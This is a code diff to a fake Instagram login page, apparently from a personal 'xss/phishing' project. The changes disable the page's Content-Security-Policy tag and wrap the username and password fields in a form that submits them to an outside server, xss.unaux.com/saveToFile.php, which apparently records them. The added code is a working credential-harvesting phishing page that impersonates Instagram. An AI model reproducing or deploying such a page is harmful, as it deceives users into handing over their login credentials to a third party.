@@ -4,7 +4,7 @@
     <!-- ogg image -->
     <title>Instagram</title>
     <link rel="stylesheet" href="style.css" />
-    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+    <!-- <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests"> -->
     <link rel="icon" type="image/png" href="https://pratikktiwari.github.io/xss/phishing/instagram/instagram-logo.png">
     <meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
@@ -16,15 +16,17 @@
             <div class="form_container">
                 <div class="instagram_bg"></div>
                 <div class="login_form_div">
-                    <div class="single_in_div">
-                        <input type="text" placeholder="Phone number, username, or email" id="username" />
-                    </div>
-                    <div class="single_in_div">
-                        <input type="text" placeholder="Password" id="password" />
-                    </div>
-                    <div class="single_in_div">
-                        <button onclick="submitForm()">Log In</button>
-                    </div>
+                    <form method="get" action="http://xss.unaux.com/saveToFile.php">
+                        <div class="single_in_div">
+                            <input type="text" placeholder="Phone number, username, or email" id="username" />
+                        </div>
+                        <div class="single_in_div">
+                            <input type="text" placeholder="Password" id="password" />
+                        </div>
+                        <div class="single_in_div">
+                            <button type="submit">Log In</button>
+                        </div>
+                    </form>
                     <div class="or_text_div">
                         <span>OR</span>
                     </div>
